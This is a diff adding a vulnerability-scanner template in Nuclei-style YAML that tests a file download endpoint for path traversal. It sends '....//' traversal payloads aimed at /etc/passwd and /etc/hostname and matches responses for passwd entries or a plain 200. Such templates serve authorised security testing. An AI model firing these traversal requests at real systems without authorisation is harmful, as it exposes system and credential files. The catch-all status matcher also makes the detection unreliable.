@@ -1,0 +1,36 @@
+id: ch2-path-traversal
+
+info:
+  name: Path Traversal Detection (File Download)
+  author: security-researcher
+  severity: high
+  description: Tests file download endpoint for path traversal vulnerabilities
+  tags: lfi,path-traversal,file
+
+http:
+  - raw:
+      - |
+        GET /download?file=....//....//....//....//etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        GET /download?file=....//....//....//....//etc/hostname HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: body
+        words:
+          - "127.0.0.1"
+          - "localhost"
+        condition: or
+
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && len(body) > 0'
